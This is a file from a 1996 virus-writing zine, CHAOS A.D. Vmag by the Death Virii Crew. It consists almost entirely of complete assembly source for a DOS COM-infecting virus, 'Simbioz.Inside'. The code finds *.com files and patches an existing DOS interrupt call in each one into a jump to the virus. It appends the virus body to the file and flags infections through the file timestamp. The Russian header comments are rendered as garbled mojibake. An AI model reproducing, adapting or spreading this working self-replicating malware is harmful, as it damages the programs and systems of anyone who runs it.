   ; [Death Virii Crew] Presents
   ; CHAOS A.D. Vmag, Issue 2, Summer 1996                           file 004
   ;
   ;
   ;
   ;                ‚¨àãá - „¥¬®áâà æ¨ï ®¢®£® á¯®á®¡  § à ¦¥¨ï.
   ;
   ;                               Simbioz.Inside
   ;
   ;
   ;
   ;         *à¥¤áâ ¢«ïî   ‚ è¥ à áá¬®âà¥¨¥ ¯à¨¬¨â¨¢ë© COM-¥à¥§¨¤¥â,
   ;         ¢ ª®â®à®¬ à¥ «¨§®¢  á¯®á®¡ á¨¬¡¨®§ . ‚ à¨ â ª®¥ç® £«îçë©,
   ;         ® ¯® ªà ©¥© ¬¥à¥ ã ¬¥ï £«îç¨« â®«ìª® á à¥§¨¤¥â ¬¨ ¨ â®, ¥
   ;         ¢á¥£¤ . ‚¨àãá ¯à¥¤ § ç¥ ¨áª«îç¨â¥«ì® ¤«ï ¤¥¬®áâà æ¨¨ á¯®á®¡ .
   ;         Ÿ  ¤¥îáì íâ®â ¢¨àãá  â®«ª¥â ¢ á   à¥ «¨§ æ¨î ç¥£®-â® á¢®¥£®.
   ;
   ; ;================================ à¥§ âì âãâ ============================
   .286
   .model tiny
   .code
   org 100h
   start:

   lea dx,mess
   call virus
   nop
   int 20h
   mess db 'virii rulez$'

   virus:
   mov word ptr cs:_bp,bp
   pop bp
   sub bp,3
   pusha
   push ds es
   call $+3
   pop si
   sub si,($-virus)-1

   restore_orig_4_bytes:
   mov ah,byte ptr cs:[offset orig-offset virus+si ]
   mov al,0b4h
   mov cs:[bp],ax
   mov cs:[bp+2],21cdh
   mov bp,si

   get_dta:
   mov ah,2fh
   int 21h
   mov word ptr cs:_dta,bx
   mov word ptr cs:_dta,es

   set_dta:
   mov ax,cs
   add ax,2000h
   mov ds,ax
   xor dx,dx
   mov ah,1ah
   int 21h

   find_first:
   mov ah,4eh
   mov cx,20h
   mov dx,offset fmask-offset virus
   add dx,si
   push ds cs
   pop ds
   int 21h
   pop ds
   find:
   jnc save
   _er:
   jmp er

   find_next:
   mov ax,cs
   add ax,2000h
   mov ds,ax

   mov ah,4fh
   int 21h
   jmp find

   save:
   mov ax,ds:[16h]
   mov cs:_time,ax
   and al,01fh
   cmp al,7
   jz find_next
   mov ax,ds:[18h]
   mov cs:_date,ax

   open_find_file:
   mov ax,3d02h
   mov dx,1eh
   int 21h
   jnc read_file
   jmp find_next
   read_file:
   xchg ax,bx

   change_segment:
   mov ax,ds
   add ax,10h
   mov ds,ax

   mov ah,3fh
   xor dx,dx
   mov cx,0f000h
   int 21h
   jnc search_code
   jmp close

   search_code:
   push ds
   pop es
   mov cx,ax
   mov si,ax
   mov di,dx
   uuu:
   mov al,0b4h
   new:
   cld
   repne scasb
   jne close
   cmp word ptr es:[di+1],21CDh
   jne new
   great:
   mov ax,di
   dec ax
   mov cx,si
   mov si,ax
   mov dx,cx
   sub dx,ax
   sub dx,3

   change_code:
   mov byte ptr ds:[si],0e8h
   mov al,byte ptr ds:[si+1]
   mov byte ptr cs:[offset orig - offset virus + bp],al
   mov word ptr ds:[si+1],dx
   in al,42h
   mov byte ptr ds:[si+3],al

   pointer_to_begin:
   push cx
   mov ax,4200h
   xor cx,cx
   xor dx,dx
   int 21h
   pop cx
   jc close

   save_file:
   mov ah,40h
   xor dx,dx
   int 21h
   jc rest

   pointer_to_end:
   mov ax,4202h
   xor cx,cx
   xor dx,dx
   int 21h
   jc rest

   save_virus:
   mov ah,40h
   mov cx,virlen
   push cs
   pop ds
   mov dx,bp
   int 21h
   jc rest

   change_time_to_7_second:
   mov ax,cs:_time
   and al,01fh
   add al,7
   mov cs:_time,ax

   rest:
   mov ax,5701h
   mov dx,cs:_date
   mov cx,cs:_time
   int 21h

   close:
   mov ah,3eh
   int 21h

   jmp find_next

   er:
   mov ah,1ah
   lds dx,cs:_dta
   int 21h
   pop es ds
   popa
   push bp
   mov bp,word ptr cs:_bp
   ret

   fmask db '*.com',0
   iam db '[Simbioz.Inside]'
   _bp equ 0feh
   _dta equ 0f0h
   _time equ 0f4h
   _date equ 0f6h
   orig db 9
   virlen equ $-virus
   end start
   ;================================ à¥§ âì âãâ ============================


                                                       ;(c) by Reminder [DVC]
